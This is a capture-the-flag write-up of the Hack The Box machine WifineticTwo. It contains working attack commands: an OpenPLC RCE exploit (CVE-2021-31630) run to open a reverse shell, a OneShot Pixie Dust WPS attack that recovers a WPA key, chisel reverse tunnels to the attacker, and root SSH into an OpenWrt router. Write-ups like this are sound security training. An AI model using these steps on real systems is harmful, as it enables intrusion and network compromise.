# HTB – WifineticTwo
### TL;DR
This is a nice machine that resembles an IT and hardware pentesting scenario, with the end goal of rooting a WiFi access point. For the IT part we have to root a machine by exploiting a vulnerability (CVE-2021-31630) in an OpenPLC server, this will be enough for the user flag. Later, for the privilege escalation part the machine developers have set in place a cool WiFi virtualization environment. First we attack the WiFi with OneShot, which will enable us to obtain the WPA-PSK network key. Once inside the WLAN, access to the WiFi AP is gained by abusing a security misconfiguration related to the root account in the AP embedded Linux (OpenWRT).
### KEYWORDS
OpenPLC, CVE-2021-31630, WiFi, WPA-PSK, WPS, OneShot, Pixie Dust attack, port forwarding, chisel, OpenWRT.
### REFERENCES
https://autonomylogic.com/docs/2-1-openplc-runtime-overview<br>
https://www.cvedetails.com/cve/CVE-2021-31630<br> https://www.exploit-db.com/exploits/49803<br>
https://askubuntu.com/questions/16584/how-to-connect-and-disconnect-to-a-network-manually-in-terminal<br>
https://unix.stackexchange.com/questions/283722/how-to-connect-to-wifi-from-command-line<br>
https://en.kali.tools/?p=1002<br>
https://miloserdov.org/?p=3393<br>
https://github.com/kimocoder/OneShot<br>
https://launchpad.net/luci<br>
https://openwrt.org<br>
https://openwrt.org/docs/guide-quick-start/walkthrough_login<br>
<br>
### ENUMERATION
Port scan.
```markdown
> nmap $target -p- --min-rate=5000 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-17 16:07 EDT
Nmap scan report for 10.10.11.7
Host is up, received user-set (0.11s latency).
Not shown: 52303 closed tcp ports (conn-refused), 13230 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
8080/tcp open  http-proxy syn-ack

Nmap done: 1 IP address (1 host up) scanned in 18.78 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p22,8080 -sV -sC -Pn -vv -n
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-17 16:11 EDT
Nmap scan report for 10.10.11.7
Host is up, received user-set (0.12s latency).
Scanned at 2024-03-17 16:11:11 EDT for 21s

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
8080/tcp open  http-proxy syn-ack Werkzeug/1.0.1 Python/2.7.18
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://10.10.11.7:8080/login
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 232
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZfdObg.94hXN2L08gucOGoFN7e97U_38Tw; Expires=Sun, 17-Mar-2024 20:16:26 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Sun, 17 Mar 2024 20:11:26 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 302 FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 219
|     location: http://0.0.0.0:8080/login
|     vary: Cookie
|     set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.ZfdObg.8A54Fk8PNQ5iFScDuWIE8yZuJmw; Expires=Sun, 17-Mar-2024 20:16:26 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Sun, 17 Mar 2024 20:11:26 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to target URL: <a href="/login">/login</a>. If not click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     content-type: text/html; charset=utf-8
|     allow: HEAD, OPTIONS, GET
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZfdObg.94hXN2L08gucOGoFN7e97U_38Tw; Expires=Sun, 17-Mar-2024 20:16:26 GMT; HttpOnly; Path=/
|     content-length: 0
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Sun, 17 Mar 2024 20:11:26 GMT
|   RTSPRequest: 
|     HTTP/1.1 400 Bad request
|     content-length: 90
|     cache-control: no-cache
|     content-type: text/html
|     connection: close
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|_    </body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=3/17%Time=65F74E65%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,24C,"HTTP/1\.0\x20302\x20FOUND\r\ncontent-type:\x20text/html;\
SF:x20charset=utf-8\r\ncontent-length:\x20219\r\nlocation:\x20http://0\.0\
SF:.0\.0:8080/login\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfZnJlc
SF:2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.ZfdObg\.8A54Fk8PNQ5iFScDuWIE8yZu
SF:Jmw;\x20Expires=Sun,\x2017-Mar-2024\x2020:16:26\x20GMT;\x20HttpOnly;\x2
SF:0Path=/\r\nserver:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20S
SF:un,\x2017\x20Mar\x202024\x2020:11:26\x20GMT\r\n\r\n<!DOCTYPE\x20HTML\x2
SF:0PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>Redire
SF:cting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x20be
SF:\x20redirected\x20automatically\x20to\x20target\x20URL:\x20<a\x20href=\
SF:"/login\">/login</a>\.\x20\x20If\x20not\x20click\x20the\x20link\.")%r(H
SF:TTPOptions,14E,"HTTP/1\.0\x20200\x20OK\r\ncontent-type:\x20text/html;\x
SF:20charset=utf-8\r\nallow:\x20HEAD,\x20OPTIONS,\x20GET\r\nvary:\x20Cooki
SF:e\r\nset-cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.ZfdObg\.94hXN2L
SF:08gucOGoFN7e97U_38Tw;\x20Expires=Sun,\x2017-Mar-2024\x2020:16:26\x20GMT
SF:;\x20HttpOnly;\x20Path=/\r\ncontent-length:\x200\r\nserver:\x20Werkzeug
SF:/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Sun,\x2017\x20Mar\x202024\x2020
SF::11:26\x20GMT\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\x20re
SF:quest\r\ncontent-length:\x2090\r\ncache-control:\x20no-cache\r\ncontent
SF:-type:\x20text/html\r\nconnection:\x20close\r\n\r\n<html><body><h1>400\
SF:x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20req
SF:uest\.\n</body></html>\n")%r(FourOhFourRequest,224,"HTTP/1\.0\x20404\x2
SF:0NOT\x20FOUND\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\nconten
SF:t-length:\x20232\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfcGVyb
SF:WFuZW50Ijp0cnVlfQ\.ZfdObg\.94hXN2L08gucOGoFN7e97U_38Tw;\x20Expires=Sun,
SF:\x2017-Mar-2024\x2020:16:26\x20GMT;\x20HttpOnly;\x20Path=/\r\nserver:\x
SF:20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Sun,\x2017\x20Mar\x20
SF:2024\x2020:11:26\x20GMT\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C/
SF:/DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</title
SF:>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20f
SF:ound\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20
SF:manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\
SF:.</p>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:11
Completed NSE at 16:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:11
Completed NSE at 16:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:11
Completed NSE at 16:11, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap

Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds
```
Enumerate the port 8080 with Firefox, an OpenPLC webserver appears.

![wifinetictwo](https://github.com/g1vi/AllTheWriteUps/assets/120142960/9b937925-d51b-41cc-ade5-41adb390fe86)

Default credentials are available in the online documentation (https://autonomylogic.com/docs/2-1-openplc-runtime-overview). Use them to login, the user dashboard appears.

![wifinetictwo untitled1](https://github.com/g1vi/AllTheWriteUps/assets/120142960/9a338aa3-ed8f-4ac2-993f-f30cd5f333e3)

According to the documentation, the OpenPLC webserver runs PLC programs created on the OpenPLC editor tool, and the webserver dashboard allows the user to configure several parameters of the runtime. At this moment we see in the dashboard the loaded file is called `blank_program.st` and the server is stopped.
### USER
If you look for OpenPLC vulnerabilities you'll find this one: https://www.cvedetails.com/cve/CVE-2021-31630, and this POC: https://www.exploit-db.com/exploits/49803<br>
<br>
The POC provides RCE when run against the host, it just needs passing user credentials as argument. Before it, change the file name in the `compile_program` in the POC to match the file currently loaded in the host OpenPLC.

![wifinetictwo untitled2](https://github.com/g1vi/AllTheWriteUps/assets/120142960/6892f943-6957-4c87-8c7c-535958eb68e0)

Start a listener and fire the exploit.
```markdown
> python3 49803.py -u http://$target:8080 -l openplc -p openplc -i 10.10.xxx.xxx -r 1919
[+] Remote Code Execution on OpenPLC_v3 WebServer
[+] Checking if host http://10.10.11.7:8080 is Up...
[+] Host Up! ...
[+] Trying to authenticate with credentials openplc:openplc
[+] Login success!
[+] PLC program uploading... 
[+] Attempt to Code injection...
[+] Spawning Reverse Shell...
[+] Failed to receive connection :(
```
A reverse shell is successfully received on port 1919 (although the script reports it failed to receive a connection).

![wifinetictwo untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/752f5b72-70ac-4128-8bec-27536a98b945)

Which can be used to retrieve the user flag (in the `/root` directory).
### ROOT
Start from the root shell obtained with the exploit and upgrade the shell.
```markdown
> python3 -c 'import pty;pty.spawn("/bin/bash");'
root@attica02:/bin#
zsh: suspended  rlwrap -cAr nc -lvp 1919

> stty raw -echo;fg
[1]  + continued  rlwrap -cAr nc -lvp 1919

> export TERM=xterm

> export SHELL=bash
root@attica02:/bin# clear
```
Enumerate the system.
```markdown
> uname -a
Linux attica02 5.4.0-173-generic #191-Ubuntu SMP Fri Feb 2 13:55:07 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```
We have root privileges on this machine, but still do not have access to the `root.txt` flag, meaning we will probably need to move laterally to another machine. For this we will need to do configuration changes on this machine (and this is why we are root).<br>
<br>
Having a look at the machine's name, there is probably something related to the wireless network configuration. Let's enumerate the network interfaces.
```markdown
> ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.3.3  netmask 255.255.255.0  broadcast 10.0.3.255
        inet6 fe80::216:3eff:fefb:30c8  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:fb:30:c8  txqueuelen 1000  (Ethernet)
        RX packets 4094  bytes 367954 (367.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3166  bytes 935088 (935.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 5  bytes 288 (288.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 288 (288.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
There is a wireless network interface `wlan0`, check its configuration.
```markdown
> iwconfig
wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
          
lo        no wireless extensions.

eth0      no wireless extensions.
```
Having root access to the machine enables us to make configuration changes on the wireless configuration, meaning the machine is running some kind of WiFi virtualization, which is really cool.<br>
<br>
There are online tutorials on WiFi management from command line here: https://askubuntu.com/questions/16584/how-to-connect-and-disconnect-to-a-network-manually-in-terminal, and here: https://unix.stackexchange.com/questions/283722/how-to-connect-to-wifi-from-command-line<br>
<br>
Let's start scanning for available WiFi networks.
```markdwon
> iw dev wlan0 scan
BSS 02:00:00:00:01:00(on wlan0)
        last seen: 1842.216s [boottime]
        TSF: 1710758388354172 usec (19800d, 10:39:48)
        freq: 2412
        beacon interval: 100 TUs
        capability: ESS Privacy ShortSlotTime (0x0411)
        signal: -30.00 dBm
        last seen: 0 ms ago
        Information elements from Probe Response frame:
        SSID: plcrouter
        Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
        DS Parameter set: channel 1
        ERP: Barker_Preamble_Mode
        Extended supported rates: 24.0 36.0 48.0 54.0 
        RSN:     * Version: 1
                 * Group cipher: CCMP
                 * Pairwise ciphers: CCMP
                 * Authentication suites: PSK
                 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
        Supported operating classes:
                 * current operating class: 81
        Extended capabilities:
                 * Extended Channel Switching
                 * SSID List
                 * Operating Mode Notification
        WPS:     * Version: 1.0
                 * Wi-Fi Protected Setup State: 2 (Configured)
                 * Response Type: 3 (AP)
                 * UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1
                 * Manufacturer:  
                 * Model:  
                 * Model Number:  
                 * Serial Number:  
                 * Primary Device Type: 0-00000000-0
                 * Device name:  
                 * Config methods: Label, Display, Keypad
                 * Version2: 2.0
```
We see there is a WiFi called `plcrouter` in range, and has WPS mode enabled. The BSSID is `02:00 :00:00:01:00`.<br>
<br>
Since WPS is enabled we could try an OneShot attack, which is a WPS attack issued from network interfaces in managed mode. More info here: https://en.kali.tools/?p=1002, and here: https://miloserdov.org/?p=3393<br>
<br>
You can find a Python OneShot script here: https://github.com/kimocoder/OneShot. We will use it to fire a Pixie Dust attack following the tutorials in the links provided.
```markdown
> python3 ./oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K
[*] Running wpa_supplicant…
[*] Running wpa_supplicant…
[*] Trying PIN '12345670'…
[*] Scanning…
[*] Authenticating…
[+] Authenticated
[*] Associating with AP…
[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
[*] Received Identity Request
[*] Sending Identity Response…
[*] Received WPS Message M1
[P] E-Nonce: B387B12DA58D3988CD0491D083A31A70
[*] Sending WPS Message M2…
[P] PKR: A06A1B4B0155CEA8AC6F0CC6CCBF9ED9D7714542792D9A182A306D548E959741C8D3D507AE303CE620CDC3A9F445C1A2634D4FC7AC9B45B1AC5144E57751D47EC54585DA543E7B7D20391266B02B6C39FA4AC312C6BBF8AC3DC2C069C5FEF815AF74BF40CF19688839588CB4CC971D16CCB47D419C1DEF696A1BB9328AC185283CF8100E826B10436511E82FCDA408A7ADE606FB9BDFB2F21CE372ADE42B5AB0CD916F6BADF98C41B9215F1758BA5260ADAEC38EDD5170F3113FC5D2F173BC79
[P] PKE: 4CF6D2826003A57CB09BAC2A9C6C405354E9E30169E9FE950B2E1B78833E024825B8DED5281BF333625E80D55F89E0219DAB96C994FFA6966C659DD8B4E25C6AD56C335130E949F3696B6AC7AFB13864C27AD148E63582EBEDAD94A6EE5B2F5FE4F96352A37652D98B162093338CFFCC298A7318CB0E4987F81489C9EC1E9B710C1746BCE8153D80AE60660C2F4D671582FC5BC80EB86BF9998B1A16B58ABE9B6EEB278603E4C6CCDBAC32B260274BDABAC60417B6317A2E81694A8DCE91ACDF
[P] AuthKey: 87FB35E66A0717C49994D3D6EE9E9416EE2C4CD9370C8AF98F20858C0AC422AD
[*] Received WPS Message M3
[P] E-Hash1: B0C833682D3439D234768B45CC4E3B83B42124A7C13CD3396517E96E009ED53D
[P] E-Hash2: C435645B234ECEA0D7EFD9B3E2088E29E3DC6EC728A4F3FE9CEF9FC28769EF90
[*] Sending WPS Message M4…
[*] Received WPS Message M5
[+] The first half of the PIN is valid
[*] Sending WPS Message M6…
[*] Received WPS Message M7
[+] WPS PIN: '12345670'
[+] WPA PSK: 'NoWWEDoKnowWhaTisReal123!'
[+] AP SSID: 'plcrouter'
```
The script dumps the WPA-PSK key. Connect to the WiFi from command line as indicated in the links provided.
```markdown
> wpa_passphrase 'plcrouter' 'NoWWEDoKnowWhaTisReal123!' > wpa.conf

> cat config.conf
network={
        ssid="plcrouter"
        #psk="NoWWEDoKnowWhaTisReal123!"
        psk=2bafe4e17630ef1834eaa9fa5c4d81fa5ef093c4db5aac5c03f1643fef02d156
}

> wpa_supplicant -B -c wpa.conf -i wlan0
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
nl80211: Could not set interface 'p2p-dev-wlan0' UP
nl80211: deinit ifname=p2p-dev-wlan0 disabled_11b_rates=0
p2p-dev-wlan0: Failed to initialize driver interface
p2p-dev-wlan0: CTRL-EVENT-DSCP-POLICY clear_all
P2P: Failed to enable P2P Device interface
```
Verify the wireless configuration is correctly loaded. If not, repeat the `wpa_supplicant` command again.
```markdown
> iwconfig
wlan0     IEEE 802.11  ESSID:"plcrouter"  
          Mode:Managed  Frequency:2.412 GHz  Access Point: 02:00:00:00:01:00   
          Bit Rate:18 Mb/s   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
          Link Quality=70/70  Signal level=-30 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:6   Missed beacon:0

eth0      no wireless extensions.

lo        no wireless extensions.
```
Verify the network interface configuration.
```markdown
> ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.3.3  netmask 255.255.255.0  broadcast 10.0.3.255
        inet6 fe80::216:3eff:fefb:30c8  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:fb:30:c8  txqueuelen 1000  (Ethernet)
        RX packets 591  bytes 60515 (60.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 278  bytes 204117 (204.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 5  bytes 288 (288.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 288 (288.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::ff:fe00:300  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)
        RX packets 2  bytes 282 (282.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 9  bytes 996 (996.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
Althoug we have correclty associated with the WiFi AP, we haven't been given an IP address by the DHCP. Assign yourself an IP address corresponding to a typical private class C network with 255.255.255.0 mask.
```markdown
> ifconfig wlan0 192.168.1.100 netmask 255.255.255.0

> ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.3.3  netmask 255.255.255.0  broadcast 10.0.3.255
        inet6 fe80::216:3eff:fefb:30c8  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:fb:30:c8  txqueuelen 1000  (Ethernet)
        RX packets 8057  bytes 11274256 (11.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3992  bytes 492270 (492.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 5  bytes 288 (288.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 288 (288.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:300  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)
        RX packets 2  bytes 282 (282.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 34  bytes 3520 (3.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
Once inside the WLAN we will enumerate the network; for this, transfer an standalone `nmap64` package to the host. Unpack the binaries and fire a ping sweep to discover network nodes.
```markdown
> ./nmap -sn 192.168.1.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2024-03-19 11:14 UTC
Nmap scan report for 192.168.1.1
Host is up (0.00015s latency).
MAC Address: 02:00:00:00:01:00 (Unknown)
Nmap scan report for 192.168.1.100
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 27.95 seconds
```
There are only 2 host, the gateway (192.168.1.1) and our machine (192.168.1.100). Enumerate the AP ports.
```markdown
> ./nmap 192.168.1.1 -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2024-03-19 11:15 UTC
Nmap scan report for 192.168.1.1
Host is up (0.000016s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
443/tcp open  https
MAC Address: 02:00:00:00:01:00 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 11.73 seconds
```
Let's do a quick enumeration of the HTTP/HTTPS open ports.
```markdown
> curl http://192.168.1.1
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
        <head>
                <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
                <meta http-equiv="Pragma" content="no-cache" />
                <meta http-equiv="Expires" content="0" />
                <meta http-equiv="refresh" content="0; URL=cgi-bin/luci/" />
                <style type="text/css">
                        body { background: white; font-family: arial, helvetica, sans-serif; }
                        a { color: black; }

                        @media (prefers-color-scheme: dark) {
                                body { background: black; }
                                a { color: white; }
                        }
                </style>
        </head>
        <body>
                <a href="cgi-bin/luci/">LuCI - Lua Configuration Interface</a>
        </body>
</html>

> curl -k https://192.168.1.1
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
        <head>
                <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
                <meta http-equiv="Pragma" content="no-cache" />
                <meta http-equiv="Expires" content="0" />
                <meta http-equiv="refresh" content="0; URL=cgi-bin/luci/" />
                <style type="text/css">
                        body { background: white; font-family: arial, helvetica, sans-serif; }
                        a { color: black; }

                        @media (prefers-color-scheme: dark) {
                                body { background: black; }
                                a { color: white; }
                        }
                </style>
        </head>
        <body>
                <a href="cgi-bin/luci/">LuCI - Lua Configuration Interface</a>
        </body>
</html>
```
A quick Google search reveals LuCI stands for LUA Configuration Interface, a web-based user interface designed for embedded devices (https://launchpad.net/luci). It is usually part of OpenWRT, an open source linux operating system for embedded devices (
https://openwrt.org).<br>
<br>
Place a `chisel` so we can get access to the LuCI portal from Kali.<br>
<br>
```markdown
# In Kali
> ./chisel64 server -p 8000 --reverse
2024/03/19 08:23:23 server: Reverse tunnelling enabled
2024/03/19 08:23:23 server: Fingerprint LeXOj0P8rhHkm92GNXNnmgVzSDfXjXj3Pbls+4zKqJQ=
2024/03/19 08:23:23 server: Listening on http://0.0.0.0:8000
2024/03/19 08:24:18 server: session#1: tun: proxy#R:80=>192.168.1.1:80: Listening

# In the victim host
> ./chisel64 client 10.10.xxx.xxx:8000 R:80:192.168.1.1:80
2024/03/19 12:28:07 client: Connecting to ws://10.10.14.86:8000
2024/03/19 12:28:08 client: Connected (Latency 80.200421ms)
```
Now browse the web page from Kali, a welcome login portal appears.

![wifinetictwo untitled4](https://github.com/g1vi/AllTheWriteUps/assets/120142960/e356fba4-7022-42c1-b23f-843fc52b537c)

In the documentation (https://openwrt.org/docs/guide-quick-start/walkthrough_login) you can find the default login for root.

![wifinetictwo untitled5](https://github.com/g1vi/AllTheWriteUps/assets/120142960/7f336a2e-d74d-45c9-a6f4-58487faa8d7f)

Navigate to `system -> administration`. Here you can configure the router root password, SSH access and SSH keys. For example, configure the SSH settings, make sure port 22 and root access are both enabled.

![wifinetictwo untitled9](https://github.com/g1vi/AllTheWriteUps/assets/120142960/06ee4af7-fcd3-436e-84a9-d8f5bb09fcb0)

In the "Router Password" tab you can change the root SSH password and log in, or you can just use the credential you used to log into the router to open an SSH connection.
```markdown
> ssh root@192.168.1.1

BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)

  _______                     ________        __
 |       |.-----.-----.-----.|  |  |  |.----.|  |_
 |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
 |_______||   __|_____|__|__||________||__|  |____|
          |__| W I R E L E S S   F R E E D O M
 -----------------------------------------------------
 OpenWrt 23.05.2, r23630-842932a63d
 -----------------------------------------------------
=== WARNING! =====================================
There is no root password defined on this device!
Use the "passwd" command to set up a new password
in order to prevent unauthorized SSH logins.
--------------------------------------------------
```

![wifinetictwo untitled3](https://github.com/g1vi/AllTheWriteUps/assets/120142960/b404d349-eefa-4b95-97c9-721ecb033221)

You are root.
### ALT. ENDING
The router configuration allows the user to add his own RSA pubkey for SSH logins. For this we need to put in place a `chisel` socks port forwarding.
```markdown
# in kali
./chisel64 server -p 8000 --reverse
2024/03/19 10:40:20 server: Reverse tunnelling enabled
2024/03/19 10:40:20 server: Fingerprint Tf9ieIbsyLF+/H6CnawpyMirigr0ZzzYUdkRb/ggiT8=
2024/03/19 10:40:20 server: Listening on http://0.0.0.0:8000
2024/03/19 10:41:18 server: session#1: tun: proxy#R:127.0.0.1:8081=>socks: Listening

# in the victim host
./chisel64 client 10.10.xxx.xxx:8000 R:8081:socks
2024/03/19 14:41:48 client: Connecting to ws://10.10.14.86:8000
2024/03/19 14:41:49 client: Connected (Latency 79.901731ms)
```
Modify the `proxychains` config accordingly.
```markdown
> cat /etc/proxychains.conf
 [ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 127.0.0.1 1081
socks5  127.0.0.1 8081
```
Enable Firefox proxy on port 8081, and navigate to http://192.168.1.1, so the HTTP traffic is forwarded through the socks tunnel.

